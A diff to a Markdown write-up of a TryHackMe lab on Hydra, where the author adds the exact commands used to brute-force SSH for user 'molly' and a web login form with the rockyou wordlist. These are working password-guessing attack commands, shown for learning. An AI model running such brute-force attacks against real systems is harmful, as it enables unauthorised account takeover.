@@ -65,11 +65,17 @@ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.184.95 http-post-form "
 
 ## My Personal Experience
 
-By applying these methods on the TryHackMe lab, I successfully:
+By applying these methods on the TryHackMe lab, I successfully performed two attacks:
 
-- Accessed the SSH account for user **molly**.
-- Cracked the password for a web login form.
-- Retrieved **Flag 1,2** as proof of success.
+- Accessed the SSH account for user **molly** using the command:
+  
+  `hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.82.184.95 ssh -t 4 -V`
+
+- Cracked the password for a web login form (HTTP POST) using the command:
+  
+  `hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`
+
+As a result, I retrieved **Flag 1,2** as proof of success.
 
 ---
 
